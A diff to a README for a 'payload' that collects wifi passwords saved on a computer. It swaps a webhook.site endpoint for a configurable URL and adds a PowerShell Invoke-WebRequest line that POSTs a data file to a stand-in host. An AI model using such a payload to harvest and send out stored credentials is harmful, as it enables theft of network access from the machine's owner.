@@ -1,8 +1,15 @@
 # Objective
 
-Allows you to recover wifi passwords saved on the computer.  
-This payload uses the site `https://webhook.site` to retrieve the files.
+Allows you to recover wifi passwords saved on the computer.
+
+
+# Data recovery
+
+The data will be sent to the URL with the following powershell command:
+
+    Invoke-WebRequest -Uri http://example.com -Method POST -InFile /tmp/data
+
 
 # Settings
 
-* __ID__ (mandatory) : Your identifier (obtainable from the URL) on the site: `https://webhook.site`.
+* __URL__ (mandatory) : The URL to which the file will be sent.
